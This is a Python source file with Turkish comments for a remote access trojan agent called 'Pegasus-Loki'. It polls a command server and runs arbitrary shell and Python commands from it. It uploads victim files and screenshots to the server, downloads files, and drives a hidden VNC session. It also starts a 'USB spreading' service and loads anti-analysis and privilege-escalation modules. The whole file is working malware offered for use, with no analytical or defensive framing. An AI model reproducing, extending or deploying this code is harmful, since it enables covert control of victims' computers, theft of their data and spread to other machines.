#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pegasus-Loki Entegre Agent
Pegasus RAT özelliklerini Loki RAT sistemine entegre eder
"""

import os
import sys
import time
import threading
import platform
import subprocess
import socket
import getpass
import uuid
import json
import requests
import traceback
import tempfile
import shutil
from pathlib import Path

# Pegasus modüllerini import et
try:
    from pegasus_crypto import PegasusConfig, PegasusAES
    from pegasus_security import SecurityManager, MutexControl, AntiAnalysis, PrivilegeEscalation
    from pegasus_usb import USBManager
    from pegasus_hvnc import HVNCManager
    PEGASUS_MODULES_AVAILABLE = True
except ImportError as e:
    print(f"Pegasus modülleri yüklenemedi: {e}")
    PEGASUS_MODULES_AVAILABLE = False

# Orijinal Loki modüllerini import et
try:
    import config
    LOKI_CONFIG_AVAILABLE = True
except ImportError:
    LOKI_CONFIG_AVAILABLE = False
    print("Loki config modülü bulunamadı")

# Ek kütüphaneler
try:
    from PIL import ImageGrab
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False

class PegasusLokiAgent:
    """
    Pegasus ve Loki özelliklerini birleştiren gelişmiş agent
    """
    
    def __init__(self):
        # Temel agent özellikleri
        self.idle = True
        self.silent = False
        self.platform = platform.system() + " " + platform.release()
        self.last_active = time.time()
        self.failed_connections = 0
        self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()
        
        # Pegasus özellikleri
        self.pegasus_config = None
        self.security_manager = None
        self.usb_manager = None
        self.hvnc_manager = None
        self.crypto = None
        
        # Durum değişkenleri
        self.initialized = False
        self.security_passed = False
        
        # Sunucu bilgileri
        self.server_url = "http://localhost:5000"
        self.hello_interval = 2
        self.max_failed_connections = 10
        
        print("Pegasus-Loki Agent başlatılıyor...")
        
    def initialize(self):
        """
        Agent'ı başlatır ve tüm sistemleri hazırlar
        """
        try:
            print("Agent başlatma işlemi...")
            
            # 1. Pegasus konfigürasyonunu yükle
            if not self._load_pegasus_config():
                print("Pegasus konfigürasyonu yüklenemedi, varsayılan ayarlar kullanılacak")
            
            # 2. Güvenlik kontrollerini başlat
            if not self._initialize_security():
                print("Güvenlik kontrolleri başarısız!")
                return False
            
            # 3. Loki konfigürasyonunu yükle
            self._load_loki_config()
            
            # 4. Ek servisleri başlat
            self._initialize_services()
            
            self.initialized = True
            print("Agent başarıyla başlatıldı")
            return True
            
        except Exception as e:
            print(f"Agent başlatma hatası: {e}")
            traceback.print_exc()
            return False
    
    def _load_pegasus_config(self):
        """
        Pegasus konfigürasyonunu yükler
        """
        try:
            if not PEGASUS_MODULES_AVAILABLE:
                return False
            
            self.pegasus_config = PegasusConfig()
            
            # Şifreleme sistemini başlat
            self.crypto = PegasusAES(self.pegasus_config.master_key)
            
            # Sunucu ayarlarını güncelle
            hosts = self.pegasus_config.get_hosts()
            ports = self.pegasus_config.get_ports()
            
            if hosts and ports:
                self.server_url = f"http://{hosts[0]}:{ports[0]}"
            
            print(f"Pegasus konfigürasyonu yüklendi: {self.server_url}")
            return True
            
        except Exception as e:
            print(f"Pegasus konfigürasyon hatası: {e}")
            return False
    
    def _initialize_security(self):
        """
        Güvenlik sistemlerini başlatır
        """
        try:
            if not PEGASUS_MODULES_AVAILABLE:
                print("Pegasus güvenlik modülleri mevcut değil")
                return True  # Loki modunda devam et
            
            # Güvenlik yöneticisini başlat
            self.security_manager = SecurityManager(self.pegasus_config)
            
            if self.security_manager.initialize_security():
                self.security_passed = True
                print("Güvenlik kontrolleri başarılı")
                return True
            else:
                print("Güvenlik kontrolleri başarısız")
                return False
                
        except Exception as e:
            print(f"Güvenlik başlatma hatası: {e}")
            return True  # Hata durumunda devam et
    
    def _load_loki_config(self):
        """
        Loki konfigürasyonunu yükler
        """
        try:
            if LOKI_CONFIG_AVAILABLE:
                self.server_url = getattr(config, 'SERVER', self.server_url)
                self.hello_interval = getattr(config, 'HELLO_INTERVAL', self.hello_interval)
                self.max_failed_connections = getattr(config, 'MAX_FAILED_CONNECTIONS', self.max_failed_connections)
                
                print(f"Loki konfigürasyonu yüklendi: {self.server_url}")
            
        except Exception as e:
            print(f"Loki konfigürasyon hatası: {e}")
    
    def _initialize_services(self):
        """
        Ek servisleri başlatır
        """
        try:
            if not PEGASUS_MODULES_AVAILABLE:
                return
            
            # USB yayılma servisini başlat
            self.usb_manager = USBManager(self.pegasus_config)
            if self.usb_manager.initialize(sys.executable):
                print("USB yayılma servisi başlatıldı")
            
            # HVNC yöneticisini hazırla (isteğe bağlı başlatılacak)
            self.hvnc_manager = HVNCManager(self.pegasus_config)
            
        except Exception as e:
            print(f"Servis başlatma hatası: {e}")
    
    def get_UID(self):
        """
        Benzersiz agent ID'si döndürür
        """
        try:
            # Pegasus tarzı hardware ID
            if PEGASUS_MODULES_AVAILABLE:
                hw_info = f"{platform.node()}_{getpass.getuser()}_{uuid.getnode()}"
                return hashlib.md5(hw_info.encode()).hexdigest()[:16]
            else:
                # Loki tarzı UID
                return getpass.getuser() + "_" + str(uuid.getnode())
        except:
            return str(uuid.uuid4())[:16]
    
    def server_hello(self):
        """
        Sunucudan komut ister
        """
        try:
            # Gelişmiş agent bilgileri
            agent_info = {
                'platform': self.platform,
                'hostname': self.hostname,
                'username': self.username,
                'uid': self.uid,
                'version': '2.0-pegasus',
                'security_status': self.security_passed,
                'services': self._get_service_status()
            }
            
            # Şifrelenmiş iletişim (eğer mevcut)
            if self.crypto:
                encrypted_info = self.crypto.encrypt(json.dumps(agent_info))
                req = requests.post(
                    self.server_url + '/api/' + self.uid + '/hello',
                    json={'encrypted_data': encrypted_info},
                    timeout=10
                )
            else:
                req = requests.post(
                    self.server_url + '/api/' + self.uid + '/hello',
                    json=agent_info,
                    timeout=10
                )
            
            return req.text
            
        except Exception as e:
            print(f"Server hello hatası: {e}")
            raise
    
    def _get_service_status(self):
        """
        Servis durumlarını döndürür
        """
        status = {}
        
        try:
            if self.security_manager:
                status['security'] = self.security_manager.get_status()
            
            if self.usb_manager:
                status['usb'] = self.usb_manager.get_status()
            
            if self.hvnc_manager:
                status['hvnc'] = self.hvnc_manager.get_status()
                
        except Exception as e:
            print(f"Servis durumu alma hatası: {e}")
        
        return status
    
    def send_output(self, output, newlines=True):
        """
        Çıktıyı sunucuya gönderir
        """
        if self.silent:
            print(output)
            return
        
        if not output:
            return
        
        if newlines:
            output += "\n\n"
        
        try:
            # Şifrelenmiş gönderim (eğer mevcut)
            if self.crypto:
                encrypted_output = self.crypto.encrypt(output)
                data = {'encrypted_output': encrypted_output}
            else:
                data = {'output': output}
            
            req = requests.post(
                self.server_url + '/api/' + self.uid + '/report',
                data=data,
                timeout=10
            )
            
        except Exception as e:
            print(f"Output gönderme hatası: {e}")
    
    def execute_command(self, command_line):
        """
        Komut çalıştırır (thread'li)
        """
        def _execute():
            try:
                self.send_output(f'$ {command_line}')
                
                # Komut ayrıştırma
                parts = command_line.split()
                if not parts:
                    return
                
                cmd = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                # Pegasus özel komutları
                if cmd == 'hvnc':
                    self._handle_hvnc_command(args)
                elif cmd == 'usb_status':
                    self._handle_usb_status()
                elif cmd == 'security_status':
                    self._handle_security_status()
                elif cmd == 'encrypt':
                    self._handle_encrypt_command(args)
                elif cmd == 'decrypt':
                    self._handle_decrypt_command(args)
                
                # Loki orijinal komutları
                elif cmd == 'cd':
                    if args:
                        os.chdir(os.path.expanduser(args[0]))
                        self.send_output(f"Dizin değiştirildi: {os.getcwd()}")
                    else:
                        self.send_output("Kullanım: cd <dizin>")
                
                elif cmd == 'upload':
                    if args:
                        self._upload_file(args[0])
                    else:
                        self.send_output("Kullanım: upload <dosya>")
                
                elif cmd == 'download':
                    if len(args) >= 2:
                        self._download_file(args[0], args[1])
                    elif len(args) == 1:
                        self._download_file(args[0])
                    else:
                        self.send_output("Kullanım: download <url> [hedef]")
                
                elif cmd == 'screenshot':
                    self._take_screenshot()
                
                elif cmd == 'python':
                    if args:
                        self._execute_python(' '.join(args))
                    else:
                        self.send_output("Kullanım: python <kod>")
                
                elif cmd == 'help':
                    self._show_help()
                
                elif cmd == 'exit':
                    self._cleanup_and_exit()
                
                else:
                    # Normal shell komutu
                    self._execute_shell_command(command_line)
                
            except Exception as e:
                self.send_output(f"Komut hatası: {str(e)}\n{traceback.format_exc()}")
        
        # Thread'de çalıştır
        thread = threading.Thread(target=_execute, daemon=True)
        thread.start()
    
    def _handle_hvnc_command(self, args):
        """
        HVNC komutlarını işler
        """
        try:
            if not self.hvnc_manager:
                self.send_output("HVNC mevcut değil")
                return
            
            if not args:
                self.send_output("HVNC Komutları:\n- start [host] [port]\n- stop\n- status")
                return
            
            subcmd = args[0].lower()
            
            if subcmd == 'start':
                host = args[1] if len(args) > 1 else "127.0.0.1"
                port = int(args[2]) if len(args) > 2 else 5900
                
                if self.hvnc_manager.start_hvnc(host, port):
                    self.send_output(f"HVNC başlatıldı: {host}:{port}")
                else:
                    self.send_output("HVNC başlatılamadı")
            
            elif subcmd == 'stop':
                self.hvnc_manager.stop_hvnc()
                self.send_output("HVNC durduruldu")
            
            elif subcmd == 'status':
                status = self.hvnc_manager.get_status()
                self.send_output(f"HVNC Durumu:\n{json.dumps(status, indent=2)}")
            
            else:
                self.send_output("Geçersiz HVNC komutu")
                
        except Exception as e:
            self.send_output(f"HVNC komut hatası: {e}")
    
    def _handle_usb_status(self):
        """
        USB durumunu gösterir
        """
        try:
            if self.usb_manager:
                status = self.usb_manager.get_status()
                self.send_output(f"USB Durumu:\n{json.dumps(status, indent=2)}")
            else:
                self.send_output("USB yöneticisi mevcut değil")
        except Exception as e:
            self.send_output(f"USB durum hatası: {e}")
    
    def _handle_security_status(self):
        """
        Güvenlik durumunu gösterir
        """
        try:
            if self.security_manager:
                status = self.security_manager.get_status()
                self.send_output(f"Güvenlik Durumu:\n{json.dumps(status, indent=2)}")
            else:
                self.send_output("Güvenlik yöneticisi mevcut değil")
        except Exception as e:
            self.send_output(f"Güvenlik durum hatası: {e}")
    
    def _handle_encrypt_command(self, args):
        """
        Veri şifreleme komutu
        """
        try:
            if not self.crypto:
                self.send_output("Şifreleme mevcut değil")
                return
            
            if not args:
                self.send_output("Kullanım: encrypt <veri>")
                return
            
            data = ' '.join(args)
            encrypted = self.crypto.encrypt(data)
            self.send_output(f"Şifrelenmiş: {encrypted}")
            
        except Exception as e:
            self.send_output(f"Şifreleme hatası: {e}")
    
    def _handle_decrypt_command(self, args):
        """
        Veri şifre çözme komutu
        """
        try:
            if not self.crypto:
                self.send_output("Şifre çözme mevcut değil")
                return
            
            if not args:
                self.send_output("Kullanım: decrypt <şifrelenmiş_veri>")
                return
            
            encrypted_data = ' '.join(args)
            decrypted = self.crypto.decrypt(encrypted_data)
            self.send_output(f"Çözülmüş: {decrypted}")
            
        except Exception as e:
            self.send_output(f"Şifre çözme hatası: {e}")
    
    def _upload_file(self, filepath):
        """
        Dosya yükleme
        """
        try:
            filepath = os.path.expanduser(filepath)
            if os.path.exists(filepath) and os.path.isfile(filepath):
                self.send_output(f"[*] Yükleniyor: {filepath}")
                
                with open(filepath, 'rb') as f:
                    files = {'uploaded': f}
                    requests.post(
                        self.server_url + '/api/' + self.uid + '/upload',
                        files=files,
                        timeout=30
                    )
                
                self.send_output(f"[+] Yükleme tamamlandı: {filepath}")
            else:
                self.send_output(f"[!] Dosya bulunamadı: {filepath}")
                
        except Exception as e:
            self.send_output(f"Yükleme hatası: {e}")
    
    def _download_file(self, url, destination=None):
        """
        Dosya indirme
        """
        try:
            if not destination:
                destination = url.split('/')[-1]
            
            destination = os.path.expanduser(destination)
            
            self.send_output(f"[*] İndiriliyor: {url}")
            
            response = requests.get(url, stream=True, timeout=30)
            response.raise_for_status()
            
            with open(destination, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            
            self.send_output(f"[+] İndirme tamamlandı: {destination}")
            
        except Exception as e:
            self.send_output(f"İndirme hatası: {e}")
    
    def _take_screenshot(self):
        """
        Ekran görüntüsü alma
        """
        try:
            if not PIL_AVAILABLE:
                self.send_output("[!] PIL/Pillow mevcut değil")
                return
            
            self.send_output("[*] Ekran görüntüsü alınıyor...")
            
            screenshot = ImageGrab.grab()
            
            # Geçici dosya oluştur
            temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
            screenshot_path = temp_file.name
            temp_file.close()
            
            screenshot.save(screenshot_path)
            
            # Yükle
            self._upload_file(screenshot_path)
            
            # Geçici dosyayı sil
            os.unlink(screenshot_path)
            
            self.send_output(f"[+] Ekran görüntüsü: {screenshot_path}")
            
        except Exception as e:
            self.send_output(f"Ekran görüntüsü hatası: {e}")
    
    def _execute_python(self, code):
        """
        Python kodu çalıştırma
        """
        try:
            import io
            import sys
            
            # Çıktıyı yakala
            old_stdout = sys.stdout
            old_stderr = sys.stderr
            
            stdout_capture = io.StringIO()
            stderr_capture = io.StringIO()
            
            sys.stdout = stdout_capture
            sys.stderr = stderr_capture
            
            try:
                exec(code)
            except Exception as e:
                stderr_capture.write(str(e))
            finally:
                sys.stdout = old_stdout
                sys.stderr = old_stderr
            
            output = stdout_capture.getvalue() + stderr_capture.getvalue()
            self.send_output(output if output else "[*] Python kodu çalıştırıldı")
            
        except Exception as e:
            self.send_output(f"Python hatası: {e}")
    
    def _execute_shell_command(self, command):
        """
        Shell komutu çalıştırma
        """
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate()
            output = stdout + stderr
            
            self.send_output(output if output else "[*] Komut çalıştırıldı")
            
        except Exception as e:
            self.send_output(f"Shell komut hatası: {e}")
    
    def _show_help(self):
        """
        Yardım mesajını gösterir
        """
        help_text = """
Pegasus-Loki Agent Komutları:

=== Temel Komutlar ===
help                    - Bu yardım mesajını gösterir
exit                    - Agent'ı kapatır
cd <dizin>             - Dizin değiştirir
upload <dosya>         - Dosya yükler
download <url> [hedef] - Dosya indirir
screenshot             - Ekran görüntüsü alır
python <kod>           - Python kodu çalıştırır

=== Pegasus Özellikleri ===
hvnc start [host] [port] - HVNC başlatır
hvnc stop               - HVNC durdurur
hvnc status             - HVNC durumunu gösterir
usb_status              - USB yayılma durumu
security_status         - Güvenlik durumu
encrypt <veri>          - Veri şifreler
decrypt <şifreli>       - Veri şifresini çözer

=== Shell Komutları ===
<herhangi bir komut>    - Shell'de çalıştırır
"""
        self.send_output(help_text)
    
    def _cleanup_and_exit(self):
        """
        Temizlik yapıp çıkar
        """
        try:
            self.send_output("[*] Agent kapatılıyor...")
            
            # Servisleri temizle
            if self.usb_manager:
                self.usb_manager.cleanup()
            
            if self.hvnc_manager:
                self.hvnc_manager.stop_hvnc()
            
            if self.security_manager:
                self.security_manager.cleanup()
            
            self.send_output("[+] Temizlik tamamlandı, çıkılıyor...")
            
        except Exception as e:
            print(f"Temizlik hatası: {e}")
        finally:
            sys.exit(0)
    
    def run(self):
        """
        Ana agent döngüsü
        """
        if not self.initialize():
            print("Agent başlatılamadı!")
            return
        
        print("Agent ana döngüsü başlatılıyor...")
        
        while True:
            try:
                # Sunucudan komut al
                command = self.server_hello()
                self.failed_connections = 0
                
                if command and command.strip():
                    self.idle = False
                    self.last_active = time.time()
                    
                    # Komutu çalıştır
                    self.execute_command(command.strip())
                else:
                    # Boşta bekle
                    if self.idle:
                        time.sleep(self.hello_interval)
                    elif (time.time() - self.last_active) > 60:  # 60 saniye idle
                        self.idle = True
                    else:
                        time.sleep(0.5)
                
            except Exception as e:
                print(f"Ana döngü hatası: {e}")
                self.failed_connections += 1
                
                if self.failed_connections > self.max_failed_connections:
                    print("Çok fazla bağlantı hatası, çıkılıyor...")
                    break
                
                time.sleep(self.hello_interval)

def main():
    """
    Ana fonksiyon
    """
    try:
        print("Pegasus-Loki Agent v2.0")
        print("=" * 40)
        
        agent = PegasusLokiAgent()
        agent.run()
        
    except KeyboardInterrupt:
        print("\nAgent kullanıcı tarafından durduruldu")
    except Exception as e:
        print(f"Agent hatası: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
